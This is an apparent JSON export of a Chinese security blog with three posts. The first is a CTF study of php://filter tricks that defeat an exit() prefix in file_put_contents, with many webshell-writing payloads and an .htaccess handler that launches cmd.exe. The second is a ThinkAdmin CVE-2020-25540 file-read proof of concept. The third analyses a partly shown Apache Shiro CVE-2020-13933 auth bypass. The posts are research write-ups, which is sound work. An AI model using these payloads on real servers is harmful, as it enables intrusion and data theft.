{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"张三李四是大佬，李四是大佬，李四是大佬，李四是大佬，李四是大佬李四我不是大佬，我不是大佬，我不是大佬，我不是大佬，我不是大佬王五我是小白 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"file_put_contents & php://filter","slug":"file_put_contents","date":"2020-09-30T02:00:00.000Z","updated":"2020-10-12T06:10:55.188Z","comments":true,"path":"2020/09/30/file_put_contents/","link":"","permalink":"http://yoursite.com/2020/09/30/file_put_contents/","excerpt":"前言 昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php://filter 协议来实现的。平时，利用 php://filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php://filter 对 file_put_content 中几种情况的绕过方法。","text":"前言 昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php://filter 协议来实现的。平时，利用 php://filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php://filter 对 file_put_content 中几种情况的绕过方法。 file_put_contents($filename,”&lt;?php exit();”.$content); file_put_contents($content,”&lt;?php exit();”.$content); file_put_contents($filename,$content . “\\nxxxxxx”); file_put_contents($filename,”&lt;?php exit();”.$content); 首先是最为简单的一种方法，$filename 控制写入的文件名，$content 拼接在了 &lt;?php exit(); 之后。 想要 getshell 的话，必须将前面的 &lt;?php exit(); 闭合或者消除。 $filename 控制文件名，可以利用 php://filter 协议对 $content 进行解码，同时 php://filter 可以支持使用多个过滤器规则。实现的思路就为：将 ?php exit(); 解码成为 php 不认识的字符，构造的内容能够正常解码。 0x01 Base64编码 Base64 编码是使用64个可打印的 ASCII 字符（A-Z、a-z、0-9、+、/） 将任意字节序列化数据编码成 ASCII 字符串，另有 = 作为后缀的用途。同时 base64_decode 在遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当 $content 被加上&lt;?php exit(); 之后，我们可以利用 php://filter/write=convert.base64-decode 来实现对其进行解码。 在进行解码的过程中不符合 base64 编码范围的字符将被忽略，所以最后被 base64 解码的字符为 phpexit 和我们传入的其他字符。 由于 phpexit 一共七个字符，base64 在算法解码时是4个 byte 一组，所以为他随意添加一个字符（a）就可以，这样 aphpexit 会被 base64 正常的解析，后面传入的 webshell 也会被正常的解码。这样就会将 &lt;?php exit(); 这部分内容被正常的解码，不会影响后面写入的 webshell 的内容。 0x02 Rot13编码 &lt;?php exit(); 在经过 rot13 编码之后会变成 &lt;?cuc rkvg(); ，通过再传入一个 ?&gt; 将其闭合 同时，在 php 不开启 short_open_tag 短标签时，php 无法识别这个字符串。 0x03 .htaccess的预包含利用 利用 .htaccess 的预包含文件功能，自定义包含文件。 看到网上的文章的利用方法为 12$filename='php://filter/write=string.strip_tags/resource=.htaccess'$content='?&gt;php_value%20auto_prepend_file%20G:\\s1mple.php' 我尝试了多次之后无法利用成功，随即又被指导另一种方法在 .htaccess 中写入 Options +ExecCGI AddHandler fcgid-script .abc FcgidWrapper \"C:/Windows/System32/cmd.exe /c start cmd.exe\" .abc 然后再随意生成一个 .abc 后缀的文件，访问就可以打开 cmd 控制框。 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=.htaccess'$content='?&gt;T3B0aW9ucyArRXhlY0NHSQ0KQWRkSGFuZGxlciBmY2dpZC1zY3JpcHQgLmFiYw0KRmNnaWRXcmFwcGVyICJDOi9XaW5kb3dzL1N5c3RlbTMyL2NtZC5leGUgL2Mgc3RhcnQgY21kLmV4ZSIgLmFiYw==' emmmm，这样似乎多此一举，为什么我不直接写一个shell进去呢，而要采用这种比较麻烦的利用方式，还是要想办法找出之前的利用方法一直无法成功的原因。 不断不断测试，发现是自己的 windows 机器上没有开启对 php_value 的支持，配置了好久发现无法成功，于是采用 ubuntu 环境进行测试。 http://192.168.176.128/?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?%3Ephp_value%20auto_prepend_file%20flag 0x04 过滤器编码组合利用 可用过滤器列表 利用 strip_tags — 从字符串中去除 HTML 和 PHP 标记 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=whippet.php ';$content = '?&gt;PD9waHAgcGhwaW5mbygpOz8+'; 利用 string.strip_tags 过滤掉 html 标签，将标签内的所有内容删除，然后再进行 base64 解码，成功写入 php 文件。但是 string.strip_tags 在 php7.3.0 以上的环境会发生错误，无法写入，但在 php5 的环境下不受影响。 利用压缩过滤器，组合使用压缩后再解压内容肯定不变，但是在中间再加入别的过滤器就有可能绕过 12$filename='php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=whippet.php';$content = '?&gt;&lt;?php phpinfo();?&gt;'; file_put_contents($content,”&lt;?php exit();”.$content); 这种情况主要是针对于写入的 shell 的文件名和文件内容变量相同时的一种绕过，这种方式需要考虑文件名和文件内容数据的兼容性。 0x01 Base64编码 (无法利用) 仅仅只利用 base64 编码的方式是无法利用成功的，利用 php://filter 来构造 POC ，后面属于写入的内容，只要在解码的时候把传入的 shell 正常解码出来，不需要的东西解析成乱码。base64 构造的 poc。 12$content = \"php://filter/convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=whippet.php\"$content = \"php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php\" 构造的shell 可以放在过滤器的位置和文件名的位置都是可以的， php://filter 在面对不可用的规则时仅仅报 Warning，然后跳过继续执行。所以构造是没有太大的问题的。但是测试发现，虽然可以生成文件，但是生成的文件内部为空。 我们可以将要进行 base64 解码的数据提取出来进行分析 phpexitphp//filter/convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=whippet.php 我们注意到在数据中存在 =，默认情况之下 = 在 base64编码中起填充作用，也就意味着结束了。在利用协议时 resource 关键字，不可或缺，所以会导致过滤器解码失败，会首先创建文件，但是解码过程出错，内容全部抛弃，所以仅仅会创建一个空文件。 简单验证一下 = 在 base64解码中所产生的影响 123&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=a\") 验证之后发现，在 base64 解码时字符 = 后面不能包含有其他的字符。 0x02 Rot13编码 rot13 编码就不存在 base64 编码的问题，所以可以轻松构造出$content = \"php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=whippet.php\" 0x03 iconv字符编码转换 convert.iconv. 这个过滤器需要 php 支持 iconv。使用 convert.iconv.* 过滤器等同于使用 iconv() 函数处理所有的流数据。 usc-2通过 usc-2 的编码进行转换，对目标字符串进行2位一反转，因为是两位一反转，所以字符的数目需要保持在偶数位上。 12#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'&lt;?php phpinfo();?&gt;'); ?&lt;hp phpipfn(o;)&gt;? $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet.php\" usc-4通过 usc-4 的编码进行转换，对目标字符串进行4位一反转；所以构造的 shell 的代码数目应该是4的倍数，同时也要保证shell之前的字符串也应该为4个字符一组。 12#echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa&lt;?php phpinfo();?&gt;');?&lt;aa phpiphp(ofn&gt;?;) $content = \"php://filter/convert.iconv.UCS-4LE.UCS-4BE|?&lt;aa phpiphp(ofn&gt;?;)|/resource=whippet.php\" utf8-utf7 convert.iconv 这个过滤器会把 = 转换为 +AD0-，而 +AD0- 是可以被 base64 进行解码的。 1234#echo iconv(\"UTF-8\",\"UTF-7\",\"=\");+AD0-SSS#echo iconv(\"UTF-8\",\"UTF-7\",\"PD9waHAgcGhwaW5mbygpOz8+\");PD9waHAgcGhwaW5mbygpOz8+- 纯字符之间进行 utf 转换之后还是其本身；所以不受影响。所以可以利用组合拳来利用成功。 1utf-8:&lt;?php exit();php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php 👇 1utf-7:+ADw?php exit()+ADs-php://filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-PD9waHAgcGhwaW5mbygpOz8+--+AHw-/resource+AD0-whippet.php //这里需要注意的是要符合base64解码按照4字节进行的，base64解码特点剔除不符合字符（只要恶意代码前面部分正常就可以，长度为4的倍数） 1234&gt;&gt;&gt; len(\"+ADwphpexit+ADsphp//filter/converticonvutf8utf7+AHwconvertbase6-decode+AHw\")74&gt;&gt;&gt; 74/418.5 所以在恶意代码之前添加两个字符满足解码条件。$content=\"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php\" 0x04 过滤器编码组合利用 UCS-2&amp;rot13 $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;uc cucvcsa(b;)&gt;?|string.rot13/resource=whippet.php\" strip_tags&amp;base64 (仅可在linux下利用成功) ① &lt;?php exit(); ?&gt; 可以直接利用 strip_tags 去除，尝试构造 payload。 $content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php\" 代码合并之后为&lt;?php exit(); php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php 分析合并之后的代码文件内容，发现成功构造 php 标签 &lt;?php ?&gt; ，同时也会发现代码中的字符 = 也被包含在 php 标签内，经过 strip_tags 处理之后都会删除，就不会影响 base64 的解码了。 虽然这样生成成功，但是因为文件名为 '?&gt;PD9waHAgcGhwaW5mbygpOz8+.php' ，在浏览器访问时，会出现访问不到的问题，主要是因为存在引号。可以通过利用伪目录的方法进行变相的绕过。 $content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\" 将 ?&gt;PD9waHAgcGhwaW5mbygpOz8+ 作为目录名，无论存在不存在，再利用 ../ 回退到原目录，这样创建出来的文件名就正常了。 为什么无法再 windows 下利用呢，主要原因是因为 windows 不支持文件名中有 ? &gt; 这样的字符。 ② (改头换面)$content=\"php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\"; 按照某篇文章所描述来讲，这个 payload 利用成功的原因是首先会根据 strip_tags 将&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt; 部分删去，然后将剩余的部分 base64-decode。然而经过测试，这样的 payload 也是可以成功的。 $content=\"php://filter/A|&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\";所以描述的应该并不正确，应该是类似开启了贪婪模式，直接从最前面的一个 &lt;? 匹配至最后面的 ?&gt; 把这些全部删除。然后再将剩余的部分进行 base64解码。 但是针对于 file_put_contents(\\$content,\"&lt;?php exit();?&gt;\".$content); 情况时，前面的 &lt;? 已经闭合，为了满足后面的闭合，所以必须要添加这个无效的过滤器。 0x05 .htaccess的预包含利用 http://192.168.176.128/?content=php://filter/string.strip_tags/?%3Ephp_value%20auto_prepend_file%20flag%20%0a%23/resource=.htaccess 利用 %0a 进行换行 # 注释后面的杂糅代码 file_put_contents($filename,$content . “\\nxxxxxx”); 这种情况较为简单，仅仅需要让后面的杂糅代码被注释掉就就可以，针对 php 而言，拥有特殊的起始符和结束符，如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。 但是在禁止使用拥有特殊起始符和结束符号的语言时，需要想办法处理掉杂糅的代码。通常利用 .htaccess 进行操作。 http://192.168.176.128/?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20flag%20%0a%23\\ 利用 %0a 进行换行 #\\ 注释后面的杂糅代码。 CTF 例题一 1234567891011121314151617181920212223242526272829&lt;?phpclass Yongen{ public $file; public $text; public function __construct($data) { return unserialize($data); } public function hasaki(){ $d = '&lt;?php die(\"nononon\");?&gt;'; $a= $d. $this-&gt;text; $file = $this-&gt;file; @file_put_contents($file, $a); } public function __destruct() { $this-&gt;hasaki(); } }$data = \"\"; if (isset($_POST['data'])){ $data = $_POST['data']; new Yongen($data); } else highlight_file(__FILE__); ?&gt; 这是一道比较典型的 php 反序列化，其中 $this -&gt; file = $file; &amp; $this -&gt; text = $text; 可控，同时 @file_put_contents($this-&gt; file,$a); 会以 $file 为文件名，&lt;?php die(\"nononon\");?&gt;+$text 为文件内容，生成一个文件。此处也是要想办法绕过死亡die()谈一谈php://filter的妙用 一文中描述了三种方法。 巧用编码与解码 $file 可以控制协议，可以通过 php://filter 协议来施展魔法；使用 php://filter 的 base64-decode 方法，将 $a 解码，利用 php base64_decode 函数特性去除”死亡exit“。base64 编码中仅仅包含64个可打印字符，php 在解码 base 64 时，遇到不在其中的字符时，会跳过这些字符，仅将合法的字符组成一个新的字符串进行解码。 123&lt;?php$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);base64_decode($_GET['txt']); 所以，当 $a 被加上 &lt;?php die(\"nononon\");?&gt; 以后，我们可以使用 php://filter/write=convert.base64-decode 来对其进行解码。在解码的过程中，字符 &lt;、?、(、)、;、&gt; 空格 等不符合 base64 编码的字符范围的将被忽略，所以最终被解码的字符仅有 phpdienononon 和其他传入的字符。phpdienononon 一共是13个字符，因为 base64 算法解码是4个 byte 一组，所以给他增加三个 a 一共十六个字符，这样前面的字符串会被正常的解析，后面我们传入的 webshell 的 base64 也会被正常的解码。结果就是 &lt;?php die(\"nononon\");?&gt; 没有了。POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=convert.base64-decode/resource=cccc.php'; public $text= 'aaaPD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; 利用字符串操作方法 &lt;?php die(\"nononon\");?&gt; 本质上是一个 XML 标签，可以利用 strip_tags 函数去除， php://filter 也是支持这个方法的。php://filter/write=strip_tags但是把原本存在的 &lt;?php die(\"nononon\");?&gt; 去除之后，我们再写入 webshell 也会被删除。 php://filter 是允许使用多个过滤器的，我们可以将 webshell 进行 base64 编码。在调用 strip_tags 之后再进行 base64-decode。 POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=dddd.php'; public $text= 'PD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; rot13编码 &lt;?php exit; ?&gt; 在经过 rot13 编码之后会变成 &lt;?cuc rkvg; ?&gt;&lt;?cuc qvr(\"abababa\");?&gt; 在经过 rot13 编码之后会变成 &lt;?cuc qvr(\"abababa\");?&gt;在 php 不开启 short_open_tag 短标签时，php 无法识别这个字符串。 POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.rot13/resource=eeee.php'; public $text= '&lt;?cuc cucvasb(); ?&gt;';}$data = new Yongen();print(serialize($data));?&gt; CTF 例题二 关于跳出死亡 exit() 还有一个类似的例子。 1234567891011121314151617&lt;?php show_source('index.php'); function getKey($path){ $name = $path.md5($_SERVER[\"REMOTE_ADDR\"]).'.php'; return $name; } echo $_SERVER[\"REMOTE_ADDR\"]; $expire = $_POST['expire']; $path = $_POST['path']; $filename = getKey($path); $value = $filename; $data = serialize($value); $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data);?&gt; 我们可以注意到关键的部分位于 12$data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data;$result = file_put_contents($filename, $data); sprintf('%012d', $expire)，会返回12位的数字字符串，与 exit();?&gt; 拼接形成一段 php 代码。 由于 exit 的存在，正常情况下程序不会执行到 exit() 后面的内容。要想办法跳出死亡 exit()。 POST path=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet 参考文章 关于file_put_contents的一些小测试file_put_content和死亡·杂糅代码之缘探索php://filter在实战当中的奇技淫巧 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","slug":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","date":"2020-09-27T08:46:41.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/09/27/Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)/","link":"","permalink":"http://yoursite.com/2020/09/27/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/","excerpt":"环境搭建 下载 ThinkAdmin 的过去版本","text":"环境搭建 下载 ThinkAdmin 的过去版本 通过 Commit 找到修复的位置，下载修复版本的前一个版本可以通过对比，重点关注修复的相关信息。可以注意到对于任意文件读取的防护仅仅是加了 禁止目录级别上跳 下载老版本的方法为，找到修改前的 Commit 点击 Browse files 就可以下载过去的版本了。 按照配置创建和导入数据库，就安装成功了。 漏洞利用 获取版本信息 http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/version 读取网站目录 http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/nodePOST rules=[\"/\"] POST rules=[\"../\"] 任意文件读取 12345678910&lt;?phpfunction encode($content){ [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))]; for ($i = 0; $i &lt; $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0); return $chars;}var_dump(encode(\"public/static/../../poc.php\"));?&gt; http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b34332r1a342w34 漏洞分析 我下载的版本为漏洞修复前的版本，可能与网上的文章有些不同，不过大体上是相同的。 app/admin/controller/api/Update.php 中引用了两个 function 可不通过登录认证就可使用。 \\app\\admin\\controller\\api\\Update::version 可以获取到当前版本 目录穿越 \\app\\admin\\controller\\api\\Update::node 将 POST 传入的参数 rules &amp; ignore 传递给 ModuleService::instance()-&gt;getChanges()跟进函数 \\think\\admin\\service\\ModuleService::getChanges 在 getChanges() 函数内，遍历传进的 $rules 数组，将参数进行转换，并与网站根目录进行路径拼接，传递给 _scanLocalFileHashList ，返回文件名与哈希值。 \\think\\admin\\service\\ModuleService::_scanLocalFileHashList 在 _scanLocalFileHashList 中，通过 scanDirectory 遍历传过来目录下的文件\\think\\admin\\service\\NodeService::scanDirectory 如此，攻击者就可以在未授权的情况下实现读取网站的文件列表。 目前采用的修复方法是，在读取完文件之后，对路径进行一个判断，看是否符合 checkAllowDownload 再返回数据。 任意文件读取 \\app\\admin\\controller\\api\\Update::get 首先从 GET读取 encode 参数并使用 decode() 解码\\decode 对应的加密函数 encode()\\encode 跟进函数 checkAllowDownload 对传入的路径进行判断\\think\\admin\\service\\ModuleService::checkAllowDownload 然后跟进白名单判断函数 _getAllowDownloadRule()\\think\\admin\\service\\ModuleService::_getAllowDownloadRule 被允许的列表 123456config public/static public/router.php public/index.php app/admin app/wechat 也就是说 $name 的不能为 databases.php 并且必须要再允许列表内的。可以通过 public/static/../../poc.php 来读取网站根目录下的 poc.php 针对 database.php 的限制，在 Windows 下可以通过 \" 来进行绕过。public/static/../../config/database\"phpemmm，但是我是没有读取出来。 事实上，利用这种方法是可以读取文件的 目前采用的修复方法还是添加了 1234// 禁止目录级别上跳 if (stripos($name, '..') !== false) { return false; } 思考 我想这个修复方法还是存在问题的，首先是对这些文件权限配置的问题，根本没有修复对文件的访问权限，再未登录的情况下，仍然能实现对文件的访问。其实是修复过滤的问题，虽然采用了增加黑名单的模式，但是，还是能直接获取得到网站的文件列表。 修复后还是首先对传入的路径进行一个查询，得出所有的文件的路径，然后将获取得到文件的路径进行判断，并不是直接对传入的路径进行判断。可能比较拗口，但是这样说，大概就能清楚。我们首先传入 / ，然后会获取得到网站根目录下所有文件的路径名，like app/admin/controller/Auth.php 然后这些值就会进行checkAllowDownload 的检验。 然后白名单为所以还是可以列出根目录下的一些文件滴。目前的过滤的 .. 暂时没有什么方法可以绕过。但是漏洞的位置还是存在，如果特殊情况可以绕过 .. 的话，还是可以实现任意文件读取。 参考文章 ThinkAdmin v6 未授权列目录/任意文件读取 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 权限绕过漏洞(CVE-2020-13933)","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-13933)","date":"2020-09-23T02:27:47.000Z","updated":"2020-10-12T06:10:55.187Z","comments":true,"path":"2020/09/23/Apache Shiro 权限绕过漏洞(CVE-2020-13933)/","link":"","permalink":"http://yoursite.com/2020/09/23/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-13933)/","excerpt":"前言 之前分析了 Apache Shiro 权限绕过漏洞(CVE-2020-11989)，过了一段时间又出现了新的权限绕过漏洞 (CVE-2020-13933)。应该是在修复的基础上进行了绕过。 CVE-2020-11989 的影响版本为 Apache Shiro &lt; 1.5.3 , CVE-2020-13933 的影响版本为 Apache Shiro &lt; 1.6.0 。","text":"前言 之前分析了 Apache Shiro 权限绕过漏洞(CVE-2020-11989)，过了一段时间又出现了新的权限绕过漏洞 (CVE-2020-13933)。应该是在修复的基础上进行了绕过。 CVE-2020-11989 的影响版本为 Apache Shiro &lt; 1.5.3 , CVE-2020-13933 的影响版本为 Apache Shiro &lt; 1.6.0 。 在这个地方 Shiro 对 url 的处理是造成 CVE-2020-11989 的原因之一，Apache Shiro 1.5.3 对此进行的修复。 然后我们查看最新版的 Apache Shiro 1.6.0 发现在 web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java 增加了从全局上对分号，反斜杠和非ASCII字符进行了过滤 环境搭建 还是选择 https://github.com/l3yx/springboot-shiro 项目进行测试下载完成后修改一下 pom.xml 中 org.apache.shiro 所对应的版本号 为 1.5.3 ，同时将 LoginController 中修改为 1234@GetMapping(\"/admin/{name}\") public String admin(@PathVariable String name) { return \"admin page,hello \" + name; } 原因之后描述，同时为了方便调试，同时在 pom.xml 文件中加入 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.5.3&lt;/version&gt;&lt;/dependency&gt; 生成 war 包，部署于Tomcat 修改 \\apache-tomcat-8.0.52\\bin\\catalina.bat 文件 123if not \"%JPDA_ADDRESS%\" == \"\" goto gotJpdaAddressset JPDA_ADDRESS=127.0.0.1:5005:gotJpdaAddress catalina.bat jpda start 启动 ，配置 idea 中的远程调试 漏洞分析 Shiro 层 Tomcat 类中的 org.apache.catalina.core.ApplicationFilterChain 是用于管理针对请求 request 的过滤器。 Tomcat 的类 ApplicationFilterChain 是一个 Java Servlet API规范 javax.servlet.FilterChain 的实现，用于管理某个请求 request 的一组过滤器 Filter 的执行。当针对一个 reques 所定义的一组过滤器 Filter 处理完该请求后，组后一个 doFilter() 调用才会执行目标 Servlet 的方法 service(),然后响应对象 response 会按照相反的顺序依次被这些Filter处理，最终到达客户端。 根据调试时显示出的调用链，可以看到先执行到了 shiro 中的 OncePerRequestFilter 这个类 在 shiro 中 org.springframework.web.filter.OncePerRequestFilter 这个类是其他的所有 filter 的父类，所有的 filter 的 doFilter 方法都是调用的这个类中的 doFIlter 方法。 首先调用 getAlreadyFilteredAttributeName() 为过滤器标记，然后判断过滤器是否已经调用过，是否未为当前请求启用。org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter 然后调用 doFilterInternal 方法，跟进后可以看到执行的是 public abstract class AbstractShiroFilter extends OncePerRequestFilter 中的 doFilterInternal 方法org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal 跟进函数 executeChainorg.apache.shiro.web.servlet.AbstractShiroFilter#executeChain 跟进函数 getExecutionChainorg.apache.shiro.web.servlet.AbstractShiroFilter#getExecutionChain 跟进其中的 getChainorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 跟进方法 getPathWithinApplicationorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication WebUtils#getPathWithinApplication 修复了之前 shiro 1.5.2 所存在的 url 双编码绕过问题。但是我们可以注意到最后的返回值是 /admin/ org.apache.shiro.web.util.WebUtils#getPathWithinApplication org.apache.shiro.web.util.WebUtils#getServletPath 返回值为 /admin/;whippet org.apache.shiro.web.util.WebUtils#getPathInfo 返回 \"\" org.apache.shiro.web.util.WebUtils#removeSemicolon 将 ; 及其之后的全部删除 回到函数 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 继续向下执行如果请求的不是 /，就去除末尾的 / ，返回值就是 /admin private static final String DEFAULT_PATH_SEPARATOR = \"/\"; 接着根据 filterChainManager.getChainNames() 获取的拦截器进行匹配 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches org.apache.shiro.util.AntPathMatcher#matchesorg.apache.shiro.util.AntPathMatcher#matchorg.apache.shiro.util.AntPathMatcher#doMatchpattDirs 的最后一位是 * 所以会返回 false 没有匹配到会返回 null 匹配到的话会指向 ProxiedFilterChain 1.路径匹配：pathMatches(pathPattern, requestURI)，默认的Fliter逐个与请求URI进行匹配；2、代理FilterChain：ProxiedFilterChain。如果匹配不上，那么直接走servlet的FilterChain，否则先走shiro的代理FilterChain（ProxiedFilterChain），之后再走servlet的FilterChain 继续单步执行最后返回 ApplicationFilterChain 相当于并没有执行 Filter 此时就相当于已经绕过了 shiro 的权限验证，可以直接访问到需要权限目录下的文件，但是有时会返回这样的界面，是因为 Spring 并没有匹配到相对应的页面。 Spring层 chain.doFilter(request, response); 接下来的调用栈如图 Spring 在 Tomcat 中运行时需要提供对 Servlet 规范的支持，因为 Tomcat 时基于 Servlert 规范的 web 容器。 DispatcherServlet 是 Servlet 规范的具体实现。在 web 开发过程中，启动 Tomcat 容器时会根据其 Servlet 规范启动 Spring 实现的 DispatcherServlet ，这样就驱动了 Spring 的运行。 DispatcherServlet 在将请求映射到处理器时，调用了 getHandlerorg.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler 跟进 getHandlerInternalorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal 通过 getLookupPathForRequest 获取请求的绝对路径org.springframework.web.util.UrlPathHelper#getLookupPathForRequest(javax.servlet.http.HttpServletRequest) org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping 跟进函数 getPathWithinApplicationorg.springframework.web.util.UrlPathHelper#getPathWithinApplication 跟进函数 getRequestUriorg.springframework.web.util.UrlPathHelper#getRequestUri decodeAndCleanUriString 对 url 进行了解码处理org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString此处存在一个问题,因为利用 ; 就可以直接绕过 shiro 的权限验证，但是为什么在直接使用 ; 时会返回 404 错误，在 spring 中不能找到该页面org.springframework.web.util.UrlPathHelper#decodeAndCleanUriStringdecodeAndCleanUriString 会先将 url 中 ; 后面的数据进行分割然后再进行 url 解码解决了这个小小的问题，又产生了一个大大的疑问，在 Apache Shiro权限绕过漏洞分析(CVE-2020-11989) 一文中师傅所利用的 POC 为 /;/test/admin/page 如果是这样的话，从 ; 